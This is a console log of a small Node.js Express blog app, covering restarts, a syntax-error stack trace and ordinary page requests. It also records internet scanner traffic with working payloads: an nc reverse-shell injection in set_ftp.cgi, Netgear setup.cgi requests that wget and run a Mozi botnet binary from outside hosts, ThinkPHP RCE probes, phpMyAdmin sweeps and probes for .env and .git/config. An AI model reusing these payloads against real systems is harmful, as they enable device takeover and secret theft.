
> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [32m200 [0m13.575 ms - 207[0m
[0mGET /stylesheets/style.css [32m200 [0m3.967 ms - 111[0m
[0mGET /favicon.ico [33m404 [0m2.156 ms - 913[0m
[0mGET / [36m304 [0m1.392 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.796 ms - -[0m
[0mGET / [32m200 [0m0.967 ms - 207[0m
[0mGET /stylesheets/style.css [32m200 [0m0.550 ms - 111[0m
[0mGET /favicon.ico [33m404 [0m1.164 ms - 913[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

/home/bitnami/blogger/controllers/home.js:2
    res.render('title', (title: 'Blog' });
                              ^

SyntaxError: Unexpected token ':'
    at wrapSafe (internal/modules/cjs/loader.js:1054:16)
    at Module._compile (internal/modules/cjs/loader.js:1102:27)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
    at Module.load (internal/modules/cjs/loader.js:986:32)
    at Function.Module._load (internal/modules/cjs/loader.js:879:14)
    at Module.require (internal/modules/cjs/loader.js:1026:19)
    at require (internal/modules/cjs/helpers.js:72:18)
    at Object.<anonymous> (/home/bitnami/blogger/routes/index.js:3:16)
    at Module._compile (internal/modules/cjs/loader.js:1138:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2020-09-15T21_47_39_286Z-debug.log

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

/home/bitnami/blogger/controllers/home.js:2
    res.render('home', (title: 'Blog' });
                             ^

SyntaxError: Unexpected token ':'
    at wrapSafe (internal/modules/cjs/loader.js:1054:16)
    at Module._compile (internal/modules/cjs/loader.js:1102:27)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
    at Module.load (internal/modules/cjs/loader.js:986:32)
    at Function.Module._load (internal/modules/cjs/loader.js:879:14)
    at Module.require (internal/modules/cjs/loader.js:1026:19)
    at require (internal/modules/cjs/helpers.js:72:18)
    at Object.<anonymous> (/home/bitnami/blogger/routes/index.js:3:16)
    at Module._compile (internal/modules/cjs/loader.js:1138:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2020-09-15T21_53_52_680Z-debug.log

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [31m500 [0m11.573 ms - 1152[0m
[0mGET /favicon.ico [33m404 [0m1.944 ms - 913[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [32m200 [0m10.351 ms - 198[0m
[0mGET /stylesheets/style.css [32m200 [0m2.805 ms - 111[0m
[0mGET / [32m200 [0m1.712 ms - 198[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [36m304 [0m10.465 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.308 ms - -[0m
[0mGET /addBlog [33m404 [0m2.437 ms - 913[0m
[0mGET /listBlog [33m404 [0m1.248 ms - 913[0m
[0mGET /blogList [32m200 [0m1.166 ms - 197[0m
[0mGET /stylesheets/style.css [36m304 [0m0.457 ms - -[0m
[0mGET /blogAdd [32m200 [0m1.128 ms - 194[0m
[0mGET /stylesheets/style.css [36m304 [0m0.435 ms - -[0m
[0mGET /blogAdd [32m200 [0m1.118 ms - 194[0m
[0mGET /stylesheets/style.css [32m200 [0m2.448 ms - 111[0m
[0mGET /favicon.ico [33m404 [0m1.028 ms - 913[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET /blogAdd [32m200 [0m16.402 ms - 209[0m
[0mGET /stylesheets/style.css [32m200 [0m5.542 ms - 111[0m
[0mGET /favicon.ico [33m404 [0m2.006 ms - 913[0m
[0mGET /blogList [32m200 [0m1.760 ms - 210[0m
[0mGET /stylesheets/style.css [36m304 [0m0.741 ms - -[0m
[0mGET / [32m200 [0m1.394 ms - 238[0m
[0mGET /stylesheets/style.css [32m200 [0m0.838 ms - 111[0m
[0mGET /favicon.ico [33m404 [0m1.213 ms - 913[0m
[0mGET / [32m200 [0m1.129 ms - 240[0m
[0mGET / [32m200 [0m0.863 ms - 240[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET /blogList [32m200 [0m10.731 ms - 211[0m
[0mGET /stylesheets/style.css [32m200 [0m2.947 ms - 111[0m
[0mGET /favicon.ico [33m404 [0m1.593 ms - 913[0m
[0mGET / [32m200 [0m2.031 ms - 506[0m
[0mGET /stylesheets/style.css [32m200 [0m0.869 ms - 111[0m
[0mGET /favicon.ico [33m404 [0m1.196 ms - 913[0m
[0mGET /blogList [36m304 [0m1.274 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.767 ms - -[0m
[0mGET /task/blogAdd [33m404 [0m1.109 ms - 913[0m
[0mGET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+89.248.166.183+1245+-e+%2Fbin%2Fsh%29 [33m404 [0m1.254 ms - 913[0m
[0mGET /ftptest.cgi?loginuse=&loginpas= [33m404 [0m0.937 ms - 913[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [32m200 [0m10.422 ms - 812[0m
[0mGET /stylesheets/style.css [32m200 [0m2.967 ms - 111[0m
[0mGET /css/bootstrap.min.css [33m404 [0m2.396 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m5.177 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.764 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m1.716 ms - 913[0m
[0mGET / [36m304 [0m1.493 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.743 ms - -[0m
[0mGET /css/bootstrap.min.css [33m404 [0m1.234 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.836 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.762 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.810 ms - 913[0m
[0mGET / [36m304 [0m1.467 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m0.767 ms - 111[0m
[0mGET /css/bootstrap.min.css [33m404 [0m1.228 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.639 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.833 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.899 ms - 913[0m
[0mGET /blogList [36m304 [0m1.216 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.437 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.614 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.483 ms - -[0m
[0mGET /favicon.ico [33m404 [0m1.136 ms - 913[0m
[0mGET / [32m200 [0m0.991 ms - 812[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [36m304 [0m10.669 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.108 ms - -[0m
[0mGET /css/bootstrap.min.css [33m404 [0m1.847 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m0.926 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.844 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m1.026 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m1.062 ms - 913[0m
[0mGET / [36m304 [0m1.088 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m2.434 ms - 111[0m
[0mGET /js/jquery.min.js [33m404 [0m1.239 ms - 913[0m
[0mGET /css/bootstrap.min.css [33m404 [0m1.726 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m1.475 ms - 913[0m
[0mGET / [36m304 [0m1.558 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.941 ms - -[0m
[0mGET /css/bootstrap.min.css [33m404 [0m1.462 ms - 913[0m
[0mGET /js/jquery.min.js [33m404 [0m1.200 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m1.638 ms - 913[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.808 ms - 913[0m
[0mGET / [32m200 [0m1.058 ms - 812[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [36m304 [0m10.801 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.211 ms - -[0m
[0mGET /js/bootstrap.min.js [32m200 [0m0.818 ms - 60044[0m
[0mGET /js/jquery.min.js [32m200 [0m4.813 ms - 89476[0m
[0mGET /css/bootstrap.min.css [32m200 [0m3.328 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m2.739 ms - 913[0m
[0mGET / [36m304 [0m1.290 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m0.720 ms - 111[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.908 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.734 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.643 ms - -[0m
[0mGET /favicon.ico [33m404 [0m1.179 ms - 913[0m
[0mGET / [36m304 [0m1.161 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m0.564 ms - 111[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.761 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.354 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.145 ms - -[0m
[0mGET /favicon.ico [33m404 [0m1.007 ms - 913[0m
[0mGET /blogList [36m304 [0m2.395 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.409 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.310 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.384 ms - -[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [32m200 [0m11.037 ms - 809[0m
[0mGET /stylesheets/style.css [32m200 [0m2.903 ms - 111[0m
[0mGET /js/bootstrap.min.js [32m200 [0m3.210 ms - 60044[0m
[0mGET /js/jquery.min.js [32m200 [0m3.868 ms - 89476[0m
[0mGET /css/bootstrap.min.css [32m200 [0m2.571 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m2.756 ms - 913[0m
[0mGET / [36m304 [0m1.394 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.939 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.162 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.647 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.602 ms - -[0m
[0mGET /blogList [32m200 [0m1.411 ms - 631[0m
[0mGET /stylesheets/style.css [36m304 [0m0.495 ms - -[0m
[0mGET /blogList [36m304 [0m1.372 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.411 ms - -[0m
[0mGET /blogAdd [32m200 [0m1.351 ms - 629[0m
[0mGET /stylesheets/style.css [32m200 [0m0.709 ms - 111[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [36m304 [0m10.919 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.409 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.779 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.737 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.748 ms - -[0m
[0mGET /blogList [32m200 [0m1.582 ms - 782[0m
[0mGET /stylesheets/style.css [36m304 [0m0.421 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.868 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.752 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.634 ms - -[0m
[0mGET /blogAdd [32m200 [0m1.892 ms - 780[0m
[0mGET /stylesheets/style.css [36m304 [0m0.442 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.659 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.199 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.370 ms - -[0m
[0mGET /blogList [36m304 [0m1.760 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.882 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.122 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.836 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.698 ms - -[0m
[0mGET / [36m304 [0m1.276 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.593 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.655 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.845 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.685 ms - -[0m
[0mGET /blogList [36m304 [0m1.162 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.450 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.620 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.730 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.531 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.337 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.860 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.031 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.694 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.575 ms - -[0m
[0mGET /blogList [36m304 [0m1.053 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.351 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.304 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.332 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.485 ms - -[0m
[0mGET / [36m304 [0m0.985 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.384 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.313 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.342 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.435 ms - -[0m
[0mGET / [36m304 [0m1.121 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.427 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.818 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.572 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.586 ms - -[0m
[0mGET /blogList [36m304 [0m1.978 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.412 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.781 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.577 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.551 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.027 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.446 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.565 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.071 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.209 ms - -[0m
[0mGET / [36m304 [0m1.014 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.387 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.055 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.249 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.545 ms - -[0m
[0mGET / [36m304 [0m1.066 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.327 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.575 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.744 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.513 ms - -[0m
[0mGET /blogList [36m304 [0m0.983 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.433 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m2.567 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.572 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.701 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.029 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.439 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.648 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.634 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.808 ms - -[0m
[0mGET /blogList [36m304 [0m1.032 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.796 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.065 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.672 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.574 ms - -[0m
[0mGET / [36m304 [0m2.020 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.936 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m5.213 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.509 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.249 ms - -[0m
[0mGET / [36m304 [0m1.336 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.189 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.612 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.767 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.558 ms - -[0m
[0mGET / [36m304 [0m1.010 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.405 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.632 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.701 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.865 ms - -[0m
[0mGET / [32m200 [0m1.012 ms - 809[0m
[0mGET / [32m200 [0m0.940 ms - 809[0m
[0mGET / [32m200 [0m1.015 ms - 809[0m
[0mGET / [32m200 [0m1.001 ms - 809[0m
[0mGET / [32m200 [0m0.954 ms - 809[0m
[0mGET / [32m200 [0m1.849 ms - 809[0m
[0mGET /.env [33m404 [0m1.560 ms - 913[0m
[0mPOST / [33m404 [0m20.114 ms - 913[0m
[0mGET / [32m200 [0m0.938 ms - 809[0m
[0mGET /.env [33m404 [0m0.925 ms - 913[0m
[0mPOST / [33m404 [0m1.112 ms - 913[0m
[0mGET /TP/public/index.php [33m404 [0m1.097 ms - 913[0m
[0mGET /TP/index.php [33m404 [0m1.092 ms - 913[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m1.125 ms - 913[0m
[0mGET /html/public/index.php [33m404 [0m1.081 ms - 913[0m
[0mGET /public/index.php [33m404 [0m1.089 ms - 913[0m
[0mGET /TP/html/public/index.php [33m404 [0m2.240 ms - 913[0m
[0mGET /elrekt.php [33m404 [0m1.057 ms - 913[0m
[0mGET /index.php [33m404 [0m1.083 ms - 913[0m
[0mGET / [32m200 [0m0.915 ms - 809[0m
[0mGET /portal/redlion [33m404 [0m1.073 ms - 913[0m
[0mGET / [32m200 [0m0.943 ms - 809[0m
[0mGET / [32m200 [0m0.892 ms - 809[0m
[0mGET /phpmyadmin/index.php?lang=en [33m404 [0m1.070 ms - 913[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.757 ms - 913[0m
[0mGET /muieblackcat [33m404 [0m1.974 ms - 913[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m1.023 ms - 913[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m1.078 ms - 913[0m
[0mGET //pHpMyAdMiN/scripts/setup.php [33m404 [0m1.083 ms - 913[0m
[0mGET //pma/scripts/setup.php [33m404 [0m1.072 ms - 913[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m1.050 ms - 913[0m
[0mGET //MyAdmin/scripts/setup.php [33m404 [0m1.064 ms - 913[0m
[0mGET //PMA2005/scripts/setup.php [33m404 [0m1.040 ms - 913[0m
[0mGET //admin/mysql/scripts/setup.php [33m404 [0m1.826 ms - 913[0m
[0mGET //admin/phpmyadmin/scripts/setup.php [33m404 [0m0.987 ms - 913[0m
[0mGET //admin/scripts/setup.php [33m404 [0m1.074 ms - 913[0m
[0mGET //db/scripts/setup.php [33m404 [0m1.134 ms - 913[0m
[0mGET //dbadmin/scripts/setup.php [33m404 [0m1.068 ms - 913[0m
[0mGET //mysql-admin/scripts/setup.php [33m404 [0m1.021 ms - 913[0m
[0mGET //mysql/scripts/setup.php [33m404 [0m0.945 ms - 913[0m
[0mGET //mysqladmin/scripts/setup.php [33m404 [0m1.019 ms - 913[0m
[0mGET //mysqlmanager/scripts/setup.php [33m404 [0m0.991 ms - 913[0m
[0mGET //p/m/a/scripts/setup.php [33m404 [0m1.755 ms - 913[0m
[0mGET //noxdir/nosuichfile.php [33m404 [0m0.891 ms - 913[0m
[0mGET //nosuichfile.php [33m404 [0m0.950 ms - 913[0m
[0mGET //pHpMy/scripts/setup.php [33m404 [0m1.072 ms - 913[0m
[0mGET //php-my-admin/scripts/setup.php [33m404 [0m0.943 ms - 913[0m
[0mGET //php-myadmin/scripts/setup.php [33m404 [0m0.972 ms - 913[0m
[0mGET //phpMyA/scripts/setup.php [33m404 [0m1.023 ms - 913[0m
[0mGET //phpMyAdmi/scripts/setup.php [33m404 [0m0.903 ms - 913[0m
[0mGET //phpMyAdmin-2/scripts/setup.php [33m404 [0m3.027 ms - 913[0m
[0mGET //phpMyAdmin-3/scripts/setup.php [33m404 [0m0.884 ms - 913[0m
[0mGET //phpMyAdmin-4/scripts/setup.php [33m404 [0m0.858 ms - 913[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.937 ms - 913[0m
[0mGET //phpMyAdmin1/scripts/setup.php [33m404 [0m1.054 ms - 913[0m
[0mGET //phpMyAdmin2/scripts/setup.php [33m404 [0m1.018 ms - 913[0m
[0mGET //phpMyAds/scripts/setup.php [33m404 [0m1.058 ms - 913[0m
[0mGET //phpm/scripts/setup.php [33m404 [0m1.061 ms - 913[0m
[0mGET //phpmanager/scripts/setup.php [33m404 [0m0.945 ms - 913[0m
[0mGET //phpmy-admin/scripts/setup.php [33m404 [0m1.718 ms - 913[0m
[0mGET //phpmy/scripts/setup.php [33m404 [0m0.925 ms - 913[0m
[0mGET //phpmyad-sys/scripts/setup.php [33m404 [0m1.034 ms - 913[0m
[0mGET //phpmyad/scripts/setup.php [33m404 [0m1.014 ms - 913[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m1.057 ms - 913[0m
[0mGET //phpmyadmin2/scripts/setup.php [33m404 [0m1.044 ms - 913[0m
[0mGET //pma/scripts/setup.php [33m404 [0m1.067 ms - 913[0m
[0mGET //scripts/setup.php [33m404 [0m1.004 ms - 913[0m
[0mGET //sqladmin/scripts/setup.php [33m404 [0m1.054 ms - 913[0m
[0mGET //sqlmanager/scripts/setup.php [33m404 [0m1.001 ms - 913[0m
[0mGET //sqlweb/scripts/setup.php [33m404 [0m1.088 ms - 913[0m
[0mGET //vhcs2/tools/pma/scripts/setup.php [33m404 [0m1.007 ms - 913[0m
[0mGET //web/phpMyAdmin/scripts/setup.php [33m404 [0m1.082 ms - 913[0m
[0mGET //webadmin/scripts/setup.php [33m404 [0m1.072 ms - 913[0m
[0mGET //webdb/scripts/setup.php [33m404 [0m1.042 ms - 913[0m
[0mGET //websql/scripts/setup.php [33m404 [0m2.156 ms - 913[0m
[0mHEAD /robots.txt [33m404 [0m1.055 ms - 913[0m
[0mGET / [32m200 [0m1.776 ms - 809[0m
[0mGET / [32m200 [0m0.947 ms - 809[0m
[0mGET / [32m200 [0m1.048 ms - 809[0m
[0mGET / [32m200 [0m0.928 ms - 809[0m
[0mGET / [32m200 [0m0.932 ms - 809[0m
[0mGET / [32m200 [0m0.829 ms - 809[0m
[0mGET / [32m200 [0m0.917 ms - 809[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.992 ms - 913[0m
[0mGET / [32m200 [0m0.992 ms - 809[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m1.862 ms - 809[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.953 ms - 809[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.998 ms - 913[0m
[0mGET / [32m200 [0m1.031 ms - 809[0m
[0mGET / [32m200 [0m1.000 ms - 809[0m
[0mGET /static/theme/img/login/bg1.jpg [33m404 [0m1.074 ms - 913[0m
[0mGET / [32m200 [0m1.066 ms - 809[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.216 ms - 913[0m
[0mGET / [32m200 [0m0.876 ms - 809[0m
[0mGET / [32m200 [0m1.921 ms - 809[0m
[0mGET / [32m200 [0m0.946 ms - 809[0m
[0mGET /cdn-cgi/trace [33m404 [0m1.145 ms - 913[0m
[0mGET / [32m200 [0m0.874 ms - 809[0m
[0mGET / [32m200 [0m0.935 ms - 809[0m
[0mGET / [32m200 [0m0.982 ms - 809[0m
[0mGET / [32m200 [0m0.906 ms - 809[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.6.108.24:38614/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.178 ms - 913[0m
[0mPOST /HNAP1/ [33m404 [0m0.907 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.99.231.113:55125/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.035 ms - 913[0m
[0mGET /portal/redlion [33m404 [0m1.095 ms - 913[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m7.249 ms - 913[0m
[0mGET / [32m200 [0m4.795 ms - 809[0m
[0mGET / [32m200 [0m1.009 ms - 809[0m
[0mGET /.env [33m404 [0m0.952 ms - 913[0m
[0mGET /.git/config [33m404 [0m1.094 ms - 913[0m
[0mGET /composer.json [33m404 [0m7.106 ms - 913[0m
[0mGET /composer.lock [33m404 [0m1.081 ms - 913[0m
[0mGET / [32m200 [0m1.715 ms - 809[0m
[0mGET /frontend_dev.php/$ [33m404 [0m1.053 ms - 913[0m
[0mGET /debug/default/view?panel=config [33m404 [0m1.133 ms - 913[0m
[0mGET /muieblackcat [33m404 [0m6.265 ms - 913[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.900 ms - 913[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m0.854 ms - 913[0m
[0mGET //pma/scripts/setup.php [33m404 [0m0.978 ms - 913[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m0.921 ms - 913[0m
[0mGET //MyAdmin/scripts/setup.php [33m404 [0m0.909 ms - 913[0m
[0mGET //Admin/scripts/setup.php [33m404 [0m1.894 ms - 913[0m
[0mGET //mysql/scripts/setup.php/db/scripts/setup.php/typo3/phpmyadmin/scripts/setup.php/web/phpMyAdmin/scripts/setup.php/web/scripts/setup.php/phpmyadmin2/scripts/setup.php/admin/scripts/setup.php/admin/phpmyadmin/scripts/setup.php/phpmyadmin1/scripts/setup.php/xampp/phpmyadmin/scripts/setup.php/php-my-admin/scripts/setup.php [33m404 [0m0.921 ms - 913[0m
[0mGET / [32m200 [0m0.930 ms - 809[0m
[0mGET / [32m200 [0m0.926 ms - 809[0m
[0mGET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+89.248.166.183+1245+-e+%2Fbin%2Fsh%29 [0m- [0m- ms - -[0m
[0mGET /ftptest.cgi?loginuse=&loginpas= [33m404 [0m0.977 ms - 913[0m
[0mGET / [32m200 [0m0.916 ms - 809[0m
[0mGET /muieblackcat [33m404 [0m0.982 ms - 913[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m0.998 ms - 913[0m
[0mGET //pma/scripts/setup.php [33m404 [0m1.900 ms - 913[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m1.000 ms - 913[0m
[0mGET //MyAdmin/scripts/setup.php [33m404 [0m0.963 ms - 913[0m
[0mGET //admin/mysql/scripts/setup.php [33m404 [0m1.034 ms - 913[0m
[0mGET //admin/scripts/setup.php [33m404 [0m1.021 ms - 913[0m
[0mGET //dbadmin/scripts/setup.php [33m404 [0m1.052 ms - 913[0m
[0mGET //mysql/scripts/setup.php [33m404 [0m1.011 ms - 913[0m
[0mGET //mysqlmanager/scripts/setup.php [33m404 [0m0.995 ms - 913[0m
[0mGET //noxdir/nosuichfile.php [33m404 [0m1.003 ms - 913[0m
